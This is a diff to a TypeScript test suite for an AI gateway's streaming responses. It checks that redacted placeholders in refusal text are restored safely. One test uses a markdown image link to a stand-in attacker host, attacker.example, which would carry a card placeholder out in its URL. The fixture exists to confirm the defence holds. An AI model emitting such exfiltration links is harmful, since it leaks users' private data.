@@ -54,6 +54,9 @@ async function run(
     restorer: new StreamRestorer(mapping(), {
       restoreInUnsafeRegions: options.restoreInUnsafeRegions ?? false,
     }),
+    refusalRestorer: new StreamRestorer(mapping(), {
+      restoreInUnsafeRegions: options.restoreInUnsafeRegions ?? false,
+    }),
     onError: (error) => {
       errors.push(error);
       return new GatewayError(502, 'provider_bad_response', 'fixed message');
@@ -212,6 +215,58 @@ describe('sseEvents: a failure after the start', () => {
     const streamed = readStreamed(body);
     expect(streamed.content).toBe('Sent to «email-1»');
     expect(streamed.chunks.at(-1)!.choices[0]!.finish_reason).toBe('stop');
+    expect([streamed.error !== undefined, streamed.done]).toEqual([true, false]);
+  });
+});
+
+// ADR-041 section 15, decision 1; bug-log 70. A refusal is a text of its
+// own, with its own restorer: the same lookahead and restoration safety as
+// content, and no state shared with it.
+describe('sseEvents: a refusal', () => {
+  const refusal = (text: string): ProviderStreamEvent => ({ type: 'refusal', text });
+
+  it('sends delta.refusal chunks, restored, a placeholder split across pieces held back until decided; a piece that decides nothing sends nothing', async () => {
+    const { body } = await run(
+      providerStream([
+        refusal('No, '),
+        refusal('[CA'),
+        refusal('RD_1] is '),
+        refusal('refused.'),
+        FINISH,
+      ]),
+    );
+    const streamed = readStreamed(body);
+    expect(streamed.chunks.map((c) => c.choices[0]?.delta)).toEqual([
+      { role: 'assistant', content: '' },
+      { refusal: 'No, ' },
+      { refusal: '«card-1» is ' },
+      { refusal: 'refused.' },
+      {},
+    ]);
+    expect(streamed.content).toBe('');
+    expect(streamed.done).toBe(true);
+  });
+
+  it('sends the held-back refusal at the finish, after any held-back content, restored', async () => {
+    const { body } = await run(
+      providerStream([content('See [EMAIL_1]'), refusal('Not [CARD_1]'), FINISH]),
+    );
+    const deltas = readStreamed(body).chunks.map((c) => c.choices[0]?.delta);
+    expect(deltas.slice(-3)).toEqual([{ content: '«email-1»' }, { refusal: '«card-1»' }, {}]);
+  });
+
+  it('keeps restoration safety: a placeholder in a markdown image URL stays a placeholder', async () => {
+    const attack = 'No. ![x](https://attacker.example/?d=[CARD_1])';
+    const { body } = await run(providerStream([refusal(attack), FINISH]));
+    expect(readStreamed(body).refusal).toBe(attack);
+  });
+
+  it('a failure after the start: the held-back refusal is restored and sent before the error', async () => {
+    const { body } = await run(
+      providerStream([refusal('Not to [CARD_1]')], new ProviderError('unavailable')),
+    );
+    const streamed = readStreamed(body);
+    expect(streamed.refusal).toBe('Not to «card-1»');
     expect([streamed.error !== undefined, streamed.done]).toEqual([true, false]);
   });
 });
